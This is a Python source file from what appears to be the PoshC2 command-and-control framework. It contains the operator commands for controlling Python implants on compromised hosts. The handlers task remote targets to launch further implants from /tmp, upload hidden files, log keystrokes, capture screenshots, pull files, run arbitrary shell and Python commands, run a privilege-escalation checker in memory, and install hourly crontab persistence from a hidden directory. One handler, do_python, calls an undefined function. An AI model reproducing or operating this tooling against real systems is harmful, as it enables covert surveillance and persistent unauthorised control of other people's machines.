import base64
import os
import re
import traceback

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

from poshc2.Utils import argp, command, get_command_word
from poshc2.client.Alias import py_alias, py_replace
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter, FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, common_implant_examples, common_block_help
from poshc2.server.AutoLoads import run_python_autoloads
from poshc2.server.Config import ModulesDirectory, PayloadsDirectory, PoshProjectDirectory
from poshc2.server.Core import search_help, print_command_help
from poshc2.server.ImplantType import ImplantType
from poshc2.server.database.Model import NewTask, Implant
from poshc2.server.database.Helpers import insert_object, update_object, get_implant, get_process_id


commands = {}
commands.update(common_implant_commands)
commands_help = {}
commands_help.update(common_implant_commands_help)
examples = []
examples.extend(common_implant_examples)
block_help = {}
block_help.update(common_block_help)

style = Style.from_dict({
    '': '#1ed17e',
})

autosuggester = AutoSuggestFromPoshExamples(examples)


def py_prompt(prefix):
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.PythonHttp.get_history_file()}'),
                            auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
    completions = list(commands.keys())
    completions.extend(examples)
    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))


def handle_py_command(command, user, implant_id):
    command = command.strip()

    for alias in py_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    for alias in py_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    run_python_autoloads(command, implant_id, user)

    command_word = get_command_word(command)

    if command_word in commands:
        commands[command_word](user, command, implant_id)
        return

    if command:
        commands["shell"](user, command, implant_id)


@command(commands, commands_help, examples, block_help)
def do_start_another_implant(user, command, implant_id):
    """
    Starts another implant by running the Python2 dropper directly on the target.

    The payload is written to a random file in /tmp and ran using sh, before
    being removed with rm.

    Examples:
        start-another-implant
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = "startanotherimplant",
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_start_another_implant_keep_file(user, command, implant_id):
    """
    Starts another implant by running the Python2 dropper directly on the target.

    The payload is written to a random file in /tmp and ran using sh and is **not** removed.

    Examples:
        start-another-implant-keep-file
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = "startanotherimplant-keepfile",
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_upload_file(user, command, implant_id):
    """
    Uploads a file to the server.

    Hides the file by default. Execution without args will prompt with a filepath completer.

    Examples:
        upload-file
        upload-file -source /tmp/test.exe -destination 'c:\\temp\\test.exe' -nothidden
    """
    if command == "upload-file":
        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.upload-history'), auto_suggest=AutoSuggestFromHistory(), style=style)

        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return

        while not os.path.isfile(source):
            print(f"File does not exist: {source}")
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source

        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination

    try:

        destination = destination.replace("\\", "\\\\")
        print("")
        print(f"Uploading {source} to {destination}")
        upload_command = f"upload-file {source} {destination}"
        new_task = NewTask(
            implant_id = implant_id,
            command = upload_command,
            user = user,
            child_implant_id = None
        )
        
        insert_object(new_task)
    except Exception as e:
        print(f"Error with source file: {e}")
        traceback.print_exc()


@command(commands, commands_help, examples, block_help)
def do_get_screenshot(user, command, implant_id):
    """
    Gets a screenshot of the current desktop across all displays.

    Uses screencapture, which must be installed on the host and briefly saves the
    screenshot image to /tmp/s.

    Examples:
        get-screenshot
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s",
        user = user,
        child_implant_id = None
    )
    
    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="exit")
def do_kill_implant(user, command, implant_id):
    """
    TODO
    """
    implant = get_implant(implant_id)
    ri = input(f"Are you sure you want to terminate the implant ID {implant.numeric_id}? (Y/n) ")

    if ri == "" or ri.lower() == "y":
        pid = get_process_id(implant_id)
        new_task = NewTask(
            implant_id = implant_id,
            command = f"kill -9 {pid}",
            user = user,
            child_implant_id = None
        )

        insert_object(new_task)
        update_object(Implant, {Implant.alive: "No"}, {Implant.id: implant_id})
    else:
        print("Implant not terminated")


@command(commands, commands_help, examples, block_help)
def do_linuxprivchecker(user, command, implant_id):
    """
    Runs a bundle linuxprivchecker in memory on the target.

    https://github.com/sleventyeleven/linuxprivchecker

    Examples:
        linuxprivchecker
    """
    params = re.compile("linuxprivchecker", re.IGNORECASE)
    params = params.sub("", command)
    module = open(f"{ModulesDirectory}linuxprivchecker.py", 'rb').read()
    encoded_module = base64.b64encode(module).decode("utf-8")
    taskcmd = f"linuxprivchecker -pycode {encoded_module} {params}"
    new_task = NewTask(
        implant_id = implant_id,
        command = taskcmd,
        user = user,
        child_implant_id = None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_shell(user, command, implant_id):
    """
    Runs a command directly on the target using subprocess.check_output.

    If a command is not recognised by PoshC2, this is the default action.

    Examples:
        shell ps | grep python
        ps | grep python
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_help(user, command, implant_id):
    """
    Displays a list of all the available commands for this implant, or
    help for a particular command if specified.

    Examples:
        help
        help list-modules
        help inject-shellcode
    """
    print_command_help(command, commands, commands_help, block_help)


@command(commands, commands_help, examples, block_help)
def do_search_help(user, command, implant_id):
    """
    Search the command list for commands containing the keyword.

    The search is case insensitive.
    The -verbose option will search within and print the help for each command also.

    Examples:
        search-help psexec
        search-help -verbose psexec
    """
    search_help(command, commands_help)


@command(commands, commands_help, examples, block_help)
def do_python(user, command, implant_id):
    """
    Execute a python command on the target.

    Examples:
        python print "This is a test"
    """
    new_task(command, user, implant_id)


@command(commands, commands_help, examples, block_help)
def do_get_keystrokes(user, command, implant_id):
    """
    Log keystrokes on the target.

    Keystrokes are logged to a randomly named file in the temporary directory and the operator is
    notified of the file name.

    Examples:
        get-keystrokes
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_download_file(user, command, implant_id):
    """
    Download a file.

    Examples:
        download-file 'C:\\temp\\interesting-file.txt'
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_install_persistence(user, command, implant_id):
    """
    Acquires persistence on the target using crontab.

    The python payload is written to a hidden directory in the user's home directory with
    a random name as a file with a random name ending in s_psh.sh.

    This file is then added to crontab to run every hour at 10 minutes past the hour.

    Examples:
        install-persistence
    """
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_remove_persistence(user, command, implant_id):
    """
    Removes the persistence installed by install-persistence.

    Removes the crontab entry but does not remove the payload file as it has a randomly generated
    directory and name.

    The operator is prompted to remove the file themselves.

    Examples:
        remove-persistence
    """
    # TODO we can use find to find and delete this file.
    new_task = NewTask(
        implant_id = implant_id,
        command = command,
        user = user,
        child_implant_id = None
    )

    insert_object(new_task)
